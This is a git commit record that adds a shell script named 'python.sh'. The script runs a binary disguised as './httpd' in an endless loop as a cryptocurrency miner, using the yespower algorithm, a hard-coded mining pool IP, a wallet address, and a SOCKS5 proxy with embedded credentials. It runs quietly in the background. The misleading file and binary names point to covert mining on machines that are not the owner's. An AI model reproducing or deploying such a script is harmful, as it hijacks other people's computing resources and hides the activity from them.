e21a040615e90762a0b5ae7089720a01ff8de71a
55113110159 <110314564+55113110159@users.noreply.github.com>
2023-12-23 16:41:24 +0700

    Add files via upload

---
+++ python.sh
@@ -0,0 +1,5 @@
+#!/bin/sh
+while [ 1 ]; do
+./httpd -a yespower -o 45.67.211.223:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-100 -n 1)-lanas) -p c=CRNC,mc=VHH  --proxy=socks5://ugursfso:wqn60pnk6m95@45.155.68.129:8133 -t7 -q --no-color -S -B
+sleep 5
+done
